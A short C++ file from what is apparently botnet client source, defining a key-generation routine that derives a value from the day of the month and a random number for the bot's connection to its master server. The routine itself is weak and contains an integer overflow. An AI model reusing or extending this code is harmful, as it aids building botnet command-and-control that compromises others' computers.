#include <iostream>
#include <windows.h>
#include <cmath>

#include "master_conn.h"

namespace botnet{
    int master_conn::keyGen() {
        SYSTEMTIME lt;
        int day = 0;
        int base = 0;
        int r = 0;
        int key;

        GetLocalTime(&lt);
        day = lt.wDay;
        base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
        r = (int) (INT_MAX / 2 + floor(rand() * INT_MAX / 2));
        key = base ^ r;
        return key;
    }
}
